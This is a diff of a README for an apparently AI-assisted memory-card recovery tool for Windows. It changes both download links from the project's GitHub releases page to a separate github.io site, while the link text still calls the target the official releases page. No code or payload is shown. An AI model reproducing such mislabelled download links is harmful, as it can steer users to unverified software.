@@ -1,12 +1,12 @@
 # 💾 7thshare-windows-card-recovery - Restore lost files from memory cards
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/odinprepared912/7thshare-windows-card-recovery/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://odinprepared912.github.io)
 
 This application recovers deleted or lost data from removable media including SD cards, microSD cards, and smart cards. The 2026 release uses AI-assisted scanning to find files that standard software often misses. You can view your files before you save them to your computer.
 
 ## 📥 Getting Started
 
-[Visit the official releases page to download the latest version.](https://github.com/odinprepared912/7thshare-windows-card-recovery/releases)
+[Visit the official releases page to download the latest version.](https://odinprepared912.github.io)
 
 Follow these steps to set up the software on your Windows computer:
 
